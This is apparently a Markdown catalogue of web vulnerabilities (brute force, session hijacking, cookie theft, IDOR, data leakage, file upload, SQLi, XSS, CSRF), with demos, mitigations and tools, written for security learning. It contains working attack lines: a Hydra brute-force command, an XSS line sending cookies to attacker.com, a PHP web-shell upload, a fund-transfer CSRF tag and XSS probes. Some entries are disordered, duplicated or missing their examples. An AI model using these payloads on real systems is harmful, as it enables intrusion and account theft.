- If session ID doesn’t change → 🔥 Vulnerable to fixation!

***
**🛡️ WEBVULN-019: Brute Force Attack**
🔹 Category

Authentication

**🆔 Vulnerability ID**
**WEBVULN-019**

**🧪 Demo / Proof of Concept (PoC)**

**✅ What is a Brute Force Attack?**

- A Brute Force Attack is an automated method to guess credentials (usernames, passwords, PINs, tokens) by trying many combinations until access is granted.

**✅ Vulnerable PHP Login Example**
```php

<?php
$user = $_POST['username'];
$pass = $_POST['password'];

if ($user == "admin" && $pass == "123456") {
    echo "Login successful";
} else {
    echo "Invalid credentials";
}
```
**🎯 Attack Using Hydra (Example)**
```bash

`hydra -l admin -P /usr/share/wordlists/rockyou.txt http://target.com/login.php -V`
```
-l: login/username

-P: password list

-V: verbose output

---

### 🛡️ Mitigation

#### ✅ Account Lockout or Rate Limiting
- Temporarily block accounts after multiple failed logins (e.g., 5 tries)
- Use exponential back-off for delays

#### ✅ CAPTCHA or Bot Protection
- Use CAPTCHA to prevent automated logins
- Use WAFs or bot detection services

#### ✅ 2FA / MFA
- Enforce two-factor authentication to reduce the risk of credential stuffing

#### ✅ Logging & Monitoring
- Log failed login attempts
- Alert administrators on unusual behavior

---

### 🔧 Testing Tools / Techniques

- **Hydra**
- **Burp Suite Intruder**
- **OWASP ZAP**
- Manual login testing with predictable passwords

---

### 🔍 Indicators of Vulnerability

| Behavior                              | Risk                         |
|---------------------------------------|------------------------------|
| No delay or lockout after failures    | High risk of brute force     |
| Common usernames/passwords accepted   | Poor credential hygiene      |
| No CAPTCHA or rate limiting           | Susceptible to automation    |

---

### 📚 References

- [OWASP: Brute Force Attack](https://owasp.org/www-community/attacks/Brute_force_attack)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

***

# 🌐 WebVuln-020: Session Hijacking

**Category:**  
Session Management

**Vulnerability ID:**  
**WEBVULN-020**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A session ID is transmitted via an insecure channel or is predictable, allowing an attacker to steal or guess the session ID.

---

### 🧩 Payload:
- **Stealing Session ID via sniffing**  
   If an attacker has access to the network traffic (e.g., via a man-in-the-middle attack), they can capture the session cookie or token.

- **Session Fixation Attack**  
   An attacker may force a user to use a predetermined session ID by embedding it in a URL, request parameter, or via other means.

---

### ✅ Effect:
- **Session hijacking** allows attackers to impersonate a legitimate user and gain unauthorized access to sensitive data or functionality.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Secure HTTP-only Cookies**  
  Ensure cookies are marked with `HttpOnly` and `Secure` flags.
  
- ✅ **Use TLS/SSL**  
  Encrypt all communication channels to prevent sniffing of session tokens.

- ✅ **Implement Session Expiry and Regeneration**  
  Regularly regenerate session IDs after login and set an appropriate session timeout.

- ✅ **Enforce IP and User-Agent Binding**  
  Validate session IDs against IP addresses and user-agent strings.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (for session token interception)
- Wireshark (for sniffing network traffic)
- OWASP ZAP (for vulnerability scanning)
- Manual testing with session hijacking techniques

---

## 📚 References
- OWASP: Session Hijacking  
- PortSwigger: Session Hijacking  
- OWASP Cheat Sheet: Secure Session Management

***
# 🌐 WebVuln-021: Password Cracking

**Category:**  
Authentication

**Vulnerability ID:**  
**WEBVULN-021**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker tries to guess or crack a user’s password by using techniques such as brute force, dictionary attacks, or rainbow tables.

---

### 🧩 Payload:
- **Brute Force Attack**: An attacker systematically checks all possible combinations of characters for a password.
- **Dictionary Attack**: The attacker uses a precompiled list of common passwords or dictionary words to attempt login.
- **Rainbow Table Attack**: The attacker uses precomputed hash values to quickly compare with password hashes in the database.

---

### ✅ Effect:
- **Account Compromise**: Successful password cracking allows an attacker to gain unauthorized access to a user’s account.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Enforce Strong Password Policies**  
  Require a mix of upper and lower case letters, numbers, and special characters.
  
- ✅ **Limit Login Attempts**  
  Implement account lockout or CAPTCHA after a predefined number of failed login attempts.

- ✅ **Use Salted Password Hashes**  
  Salt passwords before hashing to prevent the use of rainbow tables.

- ✅ **Enforce Multi-Factor Authentication (MFA)**  
  Require an additional form of authentication beyond just the password.

---

## 🔧 Testing Tools / Techniques
- Hydra (for brute force and dictionary attacks)
- Burp Suite Intruder (for automated password cracking)
- John the Ripper (for cracking password hashes)
- OWASP ZAP (for vulnerability scanning and brute force testing)

---

## 📚 References
- OWASP: Password Cracking  
- PortSwigger: Password Cracking  
- OWASP Cheat Sheet: Secure Authentication

***
# 🌐 WebVuln-021: Weak Password Storage

**Category:**  
Authentication

**Vulnerability ID:**  
`WEBVULN-021`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A system stores passwords in an insecure manner, such as in plain text or using weak encryption/hashing algorithms.

---

### 🧩 Payload:
- **Plain Text Storage**: The password is stored directly in the database without encryption or hashing.
- **Weak Hashing Algorithm**: Storing passwords using weak algorithms like MD5 or SHA1, which are vulnerable to collision or brute force attacks.

---

### ✅ Effect:
- **Exposure of User Credentials**: If the database is compromised, attackers can easily recover and misuse passwords if stored in an insecure manner.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Use Strong Hashing Algorithms**  
  Hash passwords with strong algorithms like bcrypt, Argon2, or PBKDF2.
  
- ✅ **Use Salted Hashes**  
  Add a unique salt to each password before hashing to prevent rainbow table attacks.

- ✅ **Use Key Stretching**  
  Employ key stretching techniques (e.g., bcrypt) to increase the time needed to compute password hashes.

- ✅ **Encrypt Sensitive Data**  
  Store sensitive data like passwords using strong encryption methods, such as AES-256.

  ***
  # 🌐 WebVuln-022: Credential Reuse

**Category:**  
Authentication and Session Management

**Vulnerability ID:**  
**WEBVULN-022**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
Credential reuse happens when a user uses the same password across multiple services. An attacker who gains access to one service may use the same credentials to gain unauthorized access to other services (e.g., using breached credentials from a data leak).

### 🔑 Example:
- If a user’s password is found in a data breach (e.g., via a service like Have I Been Pwned), an attacker can use the same password on other platforms to try and break into the user’s accounts on different sites.

---

## 💥 Payload:

- **Credential List:**  
  User credentials (e.g., username and password) from one service can be reused to attempt login to other platforms that the user might have an account with.

---

### ✅ Effect

- **Unauthorized Access:**  
  Attackers can access multiple services or systems if a user has reused the same credentials across different sites.

- **Account Takeover:**  
  Attackers can take over user accounts in multiple platforms without needing to bypass individual authentication mechanisms.

---

## 🌐 PoC Platforms

Simulate this vulnerability by using the following:

- **Have I Been Pwned** (to check if credentials were part of a breach)
- **Credential Stuffing Attack Simulation:**  
  Use tools like **Sentry MBA** or **Snipr** to simulate credential stuffing attacks.

---

## 🛡️ Mitigation

To mitigate the risk of credential reuse, consider the following best practices:

- ✅ **Use Unique Passwords:**  
  Encourage users to use different passwords for every service. Password managers can help users store unique passwords securely.

- ✅ **Implement Two-Factor Authentication (2FA):**  
  Even if credentials are reused, 2FA will prevent unauthorized access, as attackers would need the second factor (e.g., an SMS code or authentication app code).

- ✅ **Monitor for Breaches:**  
  Use services like **Have I Been Pwned** to monitor for any breaches of your system’s users. Notify users to change their passwords if their credentials are exposed in any breach.

- ✅ **Password Policies:**  
  Enforce strong password policies (e.g., minimum length, special characters, etc.) to ensure users create hard-to-guess passwords.

- ✅ **Account Lockout & Rate Limiting:**  
  To protect against credential stuffing, implement rate-limiting, CAPTCHA challenges, and account lockouts after multiple failed login attempts.

---

## 🔧 Testing Tools / Techniques

- **Burp Suite:**  
  Use the Intruder feature to attempt credential stuffing with known breached passwords.

- **OWASP ZAP:**  
  Use ZAP to simulate attacks that test for weak or reused passwords across multiple services.

- **Have I Been Pwned API:**  
  Use the API to check if the user’s credentials have been part of a known data breach.

- **Hydra:**  
  Use Hydra for brute-force or credential-stuffing attacks if the target allows for automated login attempts.

- **Manual Testing:**  
  Test for weak or reused passwords by attempting logins with breached credentials or default password lists.

---

## 📚 References

- **OWASP: Password Management Cheat Sheet**  
  Link: [OWASP Password Management](https://cheatsheetseries.owasp.org/cheatsheets/Password_Management_Cheat_Sheet.html)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **Have I Been Pwned:**  
  Link: [Have I Been Pwned](https://haveibeenpwned.com/)

- **PortSwigger: Credential Stuffing Attacks**  
  Link: [PortSwigger Credential Stuffing](https://portswigger.net/research/credential-stuffing)

- **OWASP Cheat Sheet: Secure Password Storage**  
  Link: [OWASP Secure Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)


---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept login requests and test password storage)
- John the Ripper (to test password hash strength)
- Hashcat (for cracking weakly hashed passwords)
- OWASP ZAP (to test for weak password storage vulnerabilities)

---

## 📚 References
- OWASP: Password Storage Cheat Sheet  
- OWASP Top 10 - A2: Broken Authentication  
- PortSwigger: Password Storage Vulnerabilities  
- OWASP Cheat Sheet: Secure Storage of Passwords

***
# 🌐 WebVuln-023: Insecure Authentication

**Category:**  
Authentication

**Vulnerability ID:**  
**`WEBVULN-023`**

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
A web application fails to securely authenticate users, allowing unauthorized access or weak user verification. This can occur through improper implementation of authentication mechanisms, such as insecure session management or missing authentication mechanisms.

---

### 🧩 Payload:
- **Missing Session Expiry**: A session is not terminated after user logout or after a certain period of inactivity.
- **Weak Password Policies**: Allowing users to create easily guessable passwords (e.g., "password123").
- **Bypassing Authentication**: An attacker finds ways to bypass authentication, such as manipulating URL parameters or accessing sensitive endpoints without proper checks.

---

### ✅ Effect:
- **Unauthorized Access**: Attackers can gain access to restricted areas or accounts without proper authentication.
- **Session Hijacking**: If authentication tokens are poorly managed or transmitted insecurely, they can be hijacked.

---

## 🌐 PoC Platforms:
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

## 🛡️ Mitigation
- ✅ **Implement Secure Authentication Protocols**  
  Use strong authentication mechanisms like OAuth2, OpenID Connect, or multi-factor authentication (MFA).
  
- ✅ **Enforce Strong Password Policies**  
  Require strong passwords with a mix of letters, numbers, and special characters.

- ✅ **Use Secure Session Management**  
  Ensure that sessions are securely managed, with proper expiry, regeneration after login, and timeout mechanisms.

- ✅ **Implement CAPTCHA and Rate Limiting**  
  Use CAPTCHA and rate limiting to prevent automated login attempts and brute force attacks.

---

## 🔧 Testing Tools / Techniques
- Burp Suite (to intercept and test authentication flows)
- OWASP ZAP (for scanning insecure authentication mechanisms)
- Hydra (for testing login forms with common usernames and passwords)
- Manual testing of login and session management mechanisms

---

## 📚 References
- OWASP: Insecure Authentication  
- PortSwigger: Insecure Authentication  
- OWASP Cheat Sheet: Authentication  
- OWASP Top 10 - A2: Broken Authentication

***
# 🌐 WebVuln-024: Cookie Theft

**Category:**  
Session Management

**Vulnerability ID:**  
`WEBVULN-024`

---

## 🧪 Demo / Proof of Concept (PoC)

### 📌 Scenario:
An attacker can steal session cookies or authentication tokens through various means, such as **XSS** or **MITM** attacks, or by exploiting insecure cookie handling mechanisms in the web application.

---

### 🧩 Payload

#### **XSS (Cross-Site Scripting)**
Injecting malicious JavaScript into the application to steal cookies.

Example:
```javascript
document.location = 'http://attacker.com/cookie?'+document.cookie;
```
## 🌐 MITM Attack

If no encryption (SSL/TLS) is used, an attacker on an insecure network can intercept HTTP traffic and capture cookies.

---

### ✅ Effect

- **Session Hijacking:**  
  Once an attacker steals a valid session cookie, they can impersonate the victim and gain unauthorized access to their account or session.

- **Credential Theft:**  
  Cookies containing sensitive data, such as authentication tokens, can be captured and used for further attacks, like credential stuffing.

---

## 🌐 PoC Platforms

You can simulate this vulnerability using the following platforms:

- **DVWA (Damn Vulnerable Web Application)**  
- **bWAPP (Buggy Web Application)**  
- **WebGoat (A security-focused web application)**

---

## 🛡️ Mitigation

To mitigate the risk of cookie theft, consider the following best practices:

- ✅ **Use Secure Cookies:**  
  Ensure cookies are marked with the `HttpOnly`, `Secure`, and `SameSite` flags to reduce the risk of theft via XSS and ensure cookies are only sent over HTTPS.

- ✅ **Implement SSL/TLS (HTTPS):**  
  Always use HTTPS to encrypt communication between the client and server, which helps prevent MITM attacks and protects session cookies in transit.

- ✅ **Use SameSite Cookies:**  
  Set the `SameSite` attribute of cookies to `Strict` or `Lax` to mitigate CSRF (Cross-Site Request Forgery) and reduce the risk of cookie theft through cross-site attacks.

- ✅ **Regular Session Regeneration:**  
  Regenerate session IDs after login and periodically during a session to prevent session fixation and reduce the impact of stolen session cookies.

- ✅ **Implement Token-Based Authentication:**  
  Use token-based authentication mechanisms (e.g., JWT) for stateless sessions to prevent the reliance on session cookies.

---

## 🔧 Testing Tools / Techniques

The following tools and techniques can be used to test for and exploit cookie theft vulnerabilities:

- **Burp Suite:**  
  Use Burp Suite to intercept and manipulate cookies, as well as to test for vulnerabilities in session management.

- **OWASP ZAP:**  
  A popular open-source tool for security testing, including scanning for XSS vulnerabilities and insecure cookie handling.

- **Wireshark:**  
  Use Wireshark to sniff unencrypted HTTP traffic and capture session cookies if no SSL/TLS encryption is used.

- **Manual Testing:**  
  Test for weak or missing cookie flags, XSS vulnerabilities, and other session management weaknesses manually.

---

## 📚 References

- **OWASP: Session Management**  
  Link: [OWASP Session Management](https://owasp.org/www-project-top-ten/)

- **OWASP Top 10 - A2: Broken Authentication**  
  Link: [OWASP Top 10](https://owasp.org/www-project-top-ten/)

- **PortSwigger: Cookie Theft and XSS**  
  Link: [PortSwigger Cookie Theft](https://portswigger.net/web-security/cross-site-scripting)

- **OWASP Cheat Sheet: Secure Session Management**  
  Link: [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)


***
## PART III Sensitive Data Exposure
***
Sensitive Data Exposure
---
### WEBVULN-025: Inadequate Encryption

---

#### 📂 Category:
Cryptographic Issues

---

#### 🐞 Vulnerability:
Inadequate Encryption

---

#### 🔍 Description:
Inadequate encryption refers to the use of weak, outdated, or improperly implemented cryptographic algorithms, libraries, or protocols. This allows attackers to potentially decrypt, alter, or impersonate data and communications. Common scenarios include:
- Use of outdated SSL/TLS versions (e.g., SSLv3, TLS 1.0).
- Weak encryption algorithms (e.g., RC4, DES, MD5).
- Poor key management (e.g., hardcoded or reused keys).
- Missing encryption for sensitive data at rest or in transit.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A login form submits credentials over HTTP or via a weak cipher suite in TLS. An attacker on the same network captures traffic using a packet sniffer and extracts login credentials.

**Example Attack Tools**:
- `Wireshark` for traffic sniffing.
- `mitmproxy` for interception and SSL stripping.
- `testssl.sh` for detecting weak TLS configurations.

---

#### 🛡️ Mitigation:

- Enforce HTTPS using TLS 1.2 or higher (preferably TLS 1.3).
- Disable weak ciphers and insecure protocol versions in server configuration.
- Use strong algorithms (e.g., AES-GCM, SHA-256, RSA-2048+).
- Implement proper key management (e.g., key rotation, secure storage).
- Use HSTS to prevent protocol downgrade attacks.

---

#### 🧪 Testing Tools / Techniques:

- **testssl.sh**
- **Qualys SSL Labs** (https://www.ssllabs.com/ssltest/)
- `nmap --script ssl-enum-ciphers -p 443 <target>`
- `openssl s_client -connect <host>:443 -cipher LOW`

---

#### 📚 References:

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)
- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)

***
### WEBVULN-026: Insecure Direct Object Reference (IDOR)

---

#### 📂 Category:
Broken Access Control

---

#### 🐞 Vulnerability:
Insecure Direct Object Reference (IDOR)

---

#### 🔍 Description:
Insecure Direct Object Reference (IDOR) occurs when an application provides direct access to objects (such as files, database records, or URLs) based on user-supplied input without proper access control checks. An attacker can manipulate input parameters to gain unauthorized access to data or actions.

**Example Scenarios**:
- Accessing another user’s account data by changing a user ID in the URL.
- Downloading restricted files by altering file path or ID.
- Viewing or editing other users’ invoices, tickets, or orders.

---

#### 💣 Demo / Proof of Concept:

**Scenario**:  
A user accesses their profile using this URL:

By modifying the `id` parameter to `1002`, they can view another user's profile:


**Tools Used**:
- Burp Suite Repeater or Intruder
- Postman
- Custom Python scripts for parameter fuzzing

---

#### 🛡️ Mitigation:

- Enforce strict access controls on the server side.
- Never rely on client-side checks for authorization.
- Use indirect references such as UUIDs or securely mapped tokens.
- Implement object-level permission checks for every request.
- Log access violations and monitor unusual access patterns.

---

#### 🧪 Testing Tools / Techniques:

- Manual testing with Burp Suite or Postman
- OWASP ZAP with forced browsing
- Fuzzing predictable parameters and observing responses
- Review logs for unauthorized access attempts

---

#### 📚 References:

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Indirect_Object_Reference)
- [OWASP Broken Access Control Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Broken_Access_Control_Cheat_Sheet.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)

***
## WEBVULN-027: Data Leakage

**Category:** Information Disclosure

**Vulnerability:** Data Leakage

**Description:**
Data leakage refers to the unintended or unauthorized exposure of sensitive information, such as application configuration details, environment variables, internal API keys, credentials, stack traces, internal IPs, source code, or PII (Personally Identifiable Information). This often occurs due to misconfigurations, verbose error messages, improper access controls, or unfiltered user input being echoed back to the client.

Common causes include:
- Verbose error handling in production environments
- Exposing `.git/`, `.env`, `backup/`, or similar directories/files
- Debug features being enabled in production
- Improperly configured cloud storage (e.g., public S3 buckets)
- Misconfigured API responses

**Demo/Proof of Concept:**
1. Accessing exposed `.env` file:
`https://example.com/.env`
May reveal:
DB_PASSWORD=SuperSecret123 API_KEY=abcd1234efgh5678


2. Verbose error:
```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'

Publicly accessible backup:
`https://example.com/backup.zip`

### 📟 Verbose Error Example

```http
GET /api/user?id=notanumber HTTP/1.1

HTTP/1.1 500 Internal Server Error
Content-Type: text/html

Exception: TypeError at /api/user
int() argument must be a string, a bytes-like object or a number, not 'NoneType'
```

---

### 💾 Publicly Accessible Backup

```text
https://example.com/backup.zip
```

---

### 🛡️ Mitigation

- Disable detailed error messages in production.
- Use environment variables securely and restrict access to internal files like `.env`, `.git/`, `config/`, etc.
- Ensure cloud storage buckets are private by default.
- Apply proper access control and input validation.
- Scan and monitor endpoints for sensitive file exposure.
- Implement logging and alerting mechanisms for unusual data access patterns.
- Run content security audits regularly.

---

### 🧪 Testing Tools/Techniques

- Manual inspection of URLs and hidden directories
- Directory brute-forcing tools like:
  - `dirsearch`
  - `gobuster`
  - `ffuf`
- Inspect HTTP responses for stack traces and detailed errors
- Use recon tools to find open cloud buckets or backup files:
  - `AWSBucketDump`
  - `S3Scanner`
- Check for known leaks using tools like:
  - `truffleHog`
  - `GitLeaks`

---

### 📚 References

- [OWASP: Information Leakage](https://owasp.org/www-community/Improper_Information_Leakage)
- [OWASP Testing Guide: Testing for Information Leakage](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Testing_for_Information_Leakage.html)
- [GitHub - truffleHog](https://github.com/trufflesecurity/trufflehog)
- [GitHub - GitLeaks](https://github.com/gitleaks/gitleaks)

***
## WEBVULN-028: Unencrypted Data Storage

**Category:** Insecure Data Storage

**Vulnerability:** Unencrypted Data Storage

**Description:**
Unencrypted data storage occurs when sensitive information such as passwords, access tokens, personally identifiable information (PII), or financial records is stored in plaintext — whether in databases, local files, cookies, or logs — without adequate encryption mechanisms in place. This poses a serious security risk in case of data breaches, physical device theft, or server compromise.

Common causes include:
- Developers storing credentials or tokens in plaintext for debugging or simplicity.
- Misconfigured database storage lacking field-level encryption.
- Client-side storage of tokens or secrets in localStorage/sessionStorage.
- Logs capturing sensitive inputs or responses in readable form.

---

### 💣 Risk Example

```text
users.db
--------------
username: johndoe
password: hunter2
email: johndoe@example.com
card_number: 4111111111111111
cvv: 123
```

This file is stored unencrypted on disk and is readable by anyone with file access.

---

### 🛡️ Mitigation

- Use strong encryption (AES-256 or better) for storing sensitive data at rest.
- Store cryptographic keys securely (e.g., in HSMs or dedicated key management services).
- Hash passwords using secure algorithms like `bcrypt`, `argon2`, or `PBKDF2`.
- Avoid storing unnecessary sensitive data; follow data minimization principles.
- Avoid storing secrets in client-side localStorage/sessionStorage.
- Regularly audit stored data and review access control policies.
- Ensure backups are also encrypted and securely stored.
- Sanitize logs to remove or mask sensitive data.

---

### 🧪 Testing Tools/Techniques

- Inspect backend database storage for plaintext entries.
- Search project directories for `.db`, `.log`, `.bak`, or `.json` files with sensitive data.
- Review app logs for exposed passwords, tokens, or payment info.
- Use mobile app assessment tools to scan local data storage:
  - `MobSF`
  - `Frida`
  - `Objection`
- Review browser dev tools for client-side secrets in localStorage or cookies.

---

### 📚 References

- [OWASP Mobile Top 10: M2 - Insecure Data Storage](https://owasp.org/www-project-mobile-top-10/2016-risks/m2-insecure-data-storage)
- [OWASP Cryptographic Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html)
- [NIST SP 800-57 Part 1: Key Management Guidelines](https://csrc.nist.gov/publications/detail/sp/800-57-part-1/rev-5/final)

***
## WEBVULN-029: Missing Security Headers

**Category:** Security Misconfiguration

**Vulnerability:** Missing Security Headers

**Description:**
Missing security headers in HTTP responses can leave web applications vulnerable to a wide range of attacks, including clickjacking, XSS, MIME sniffing, and more. Security headers are part of defense-in-depth and provide essential protection by instructing browsers how to behave when interacting with your site.

Common missing headers and their impact:
- `Content-Security-Policy`: Prevents XSS by controlling sources of scripts, styles, etc.
- `X-Frame-Options`: Protects against clickjacking by preventing framing.
- `X-Content-Type-Options`: Stops MIME-sniffing attacks.
- `Strict-Transport-Security`: Enforces HTTPS connections.
- `Referrer-Policy`: Controls the amount of referrer information sent.
- `Permissions-Policy`: Restricts use of browser features (e.g., camera, microphone).
- `Cross-Origin-Embedder-Policy`, `Cross-Origin-Resource-Policy`, and `Cross-Origin-Opener-Policy`: Provide protections against cross-origin attacks.

---

### 📄 Risk Example

```http
HTTP/1.1 200 OK
Content-Type: text/html

<!-- No security headers present -->
```

This allows an attacker to:
- Inject scripts (`XSS`)
- Embed the site in an `<iframe>` (`clickjacking`)
- Trick the browser into interpreting data incorrectly (`MIME sniffing`)

---

### 🛡️ Mitigation

- Set the following headers on all HTTP responses:

```http
Content-Security-Policy: default-src 'self';
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=()
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

- Use a web server or middleware (e.g., Nginx, Apache, Express.js Helmet) to enforce headers globally.
- Regularly test for header presence using security scanners.
- Customize CSP rules according to your app’s needs (avoid overly permissive values like `unsafe-inline`).

---

### 🧪 Testing Tools/Techniques

- Use online scanners:
  - [SecurityHeaders.com](https://securityheaders.com/)
  - [Mozilla Observatory](https://observatory.mozilla.org/)
- Use command-line tools:
  - `curl -I https://yourdomain.com`
  - `nmap --script http-security-headers`
- Analyze browser DevTools > Network > Headers tab
- Automate checks using CI/CD security tools or SAST scanners

---

### 📚 References

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [Mozilla Developer Docs: Security Headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [OWASP Cheat Sheet: HTTP Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

***
## WEBVULN-030: Insecure File Handling

**Category:** Insecure File Upload / Access Control

**Vulnerability:** Insecure File Handling

**Description:**
Insecure file handling occurs when applications improperly process, upload, or serve files. This includes weak validation of uploaded file types, poor access controls on file storage, and unsafe file execution. These flaws can lead to arbitrary code execution, path traversal, denial of service, or sensitive file disclosure.

Common insecure practices:
- Allowing upload of executable files (e.g., `.php`, `.exe`, `.sh`)
- Using user input in file paths without sanitization
- Storing uploaded files in publicly accessible directories
- Not scanning or validating file content
- Serving files based on MIME type without proper checks

---

### 🐚 Risk Example

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

Then accessing:
```text
https://example.com/uploads/shell.php?cmd=whoami
```

If the server executes the PHP file, this results in **remote code execution**.

---

### 🛡️ Mitigation

- Restrict allowed file types by MIME type and extension (e.g., images only).
- Rename uploaded files and store them with randomized, non-user-controllable names.
- Use file storage outside of the web root or protect directories with `.htaccess` or server rules.
- Never serve uploaded files directly without access checks.
- Validate file content (magic numbers) in addition to extensions.
- Scan files with antivirus/malware tools before storing.
- Use a dedicated file upload handler or service (e.g., S3 + signed URLs).
- Apply server-side file size limits and sanitize file names.
- Disable script execution in upload directories.

---

### 🧪 Testing Tools/Techniques

- Attempt to upload files with extensions like `.php`, `.jsp`, `.exe`, `.aspx`
- Try path traversal using `../` in filenames or download paths
- Upload files with fake extensions or mismatched MIME types
- Use tools like:
  - `Burp Suite`
  - `Upload Scanner`
  - `OWASP ZAP`
- Manually inspect upload directory structure and permissions

---

### 📚 References

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [OWASP Testing Guide: Testing for File Upload](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/10-Input_Validation_Testing/06-Testing_for_File_Upload/)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
***


- Documenting **100+ web vulnerabilities** with testing tools and mitigation strategies.

---

## 🧨 PART 1: INJECTION EXPLOITS

---

### 🔹 WebVuln-001: SQL Injection

**Category:**  
Injection

**Vulnerability ID:**  
`WEBVULN-001`

---

### 🧪 Demo / Proof of Concept (PoC)

#### 📌 Scenario:
A login form vulnerable to SQL Injection uses the following query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```


Password can be anything.

✅ **Effect:**  
Bypasses authentication by always evaluating the WHERE clause as true.

---

🌐 **PoC Platforms:**  
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

🛡️ **Mitigation**  
✅ Use prepared statements / parameterized queries (e.g., `mysqli`, `PDO` in PHP)  
✅ Use ORM frameworks that handle escaping automatically  
✅ Enforce strict input validation and whitelisting  
✅ Disable detailed SQL error messages in production environments

---

🔧 **Testing Tools / Techniques**  
- sqlmap  
- Burp Suite (Community / Pro)  
- OWASP ZAP  
- Manual testing using known payloads

---

📚 **References**  
- OWASP SQL Injection  
- PortSwigger: SQL Injection  
- OWASP Cheat Sheet: SQL Injection Prevention

***

## WEBVULN-002: Cross-Site Scripting (XSS)

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into content served to other users. It can lead to session hijacking, defacement, or redirection to malicious sites.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A search field reflects input directly back into the HTML without sanitization:

```html
<p>You searched for: <?php echo $_GET['q']; ?></p>

```
### ✅ Result
The script executes in the user's browser, demonstrating a reflected XSS.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [XSS Game by Google](https://xss-game.appspot.com/)

---

### 🔒 Mitigation

- Escape output using appropriate HTML entity encoding
- Use Content Security Policy (CSP)
- Sanitize input on the server and client side
- Prefer safe frameworks that auto-sanitize (e.g., React, Angular)
- Avoid `innerHTML`, `document.write`, and inline event handlers

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- **OWASP ZAP**
- **XSS Hunter** (for stored XSS tracking)
- Manual payloads:
  ```html
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>

***

## WEBVULN-003: Cross-Site Request Forgery (CSRF)

### 🗂️ Category
Broken Authentication / Session Management

### ⚠️ Vulnerability Overview
Cross-Site Request Forgery (CSRF) tricks a logged-in user into executing unwanted actions on a web application where they’re authenticated. Exploits rely on the user's browser automatically including session cookies.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A vulnerable banking app allows fund transfers via a simple GET request:

`http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account`

If the user is authenticated, this request will succeed.

**Attack Example:**  
An attacker can embed this into an image or hidden form on a malicious website:

```html
<img src="http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account">

```
### Result:

If a logged-in user visits the attacker’s page, the browser sends the request with session cookies — and funds get transferred without the user’s knowledge.

***

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [WebGoat](https://owasp.org/www-project-webgoat/)

---

### 🔒 Mitigation

- Use anti-CSRF tokens (e.g., synchronizer tokens, double submit cookies)
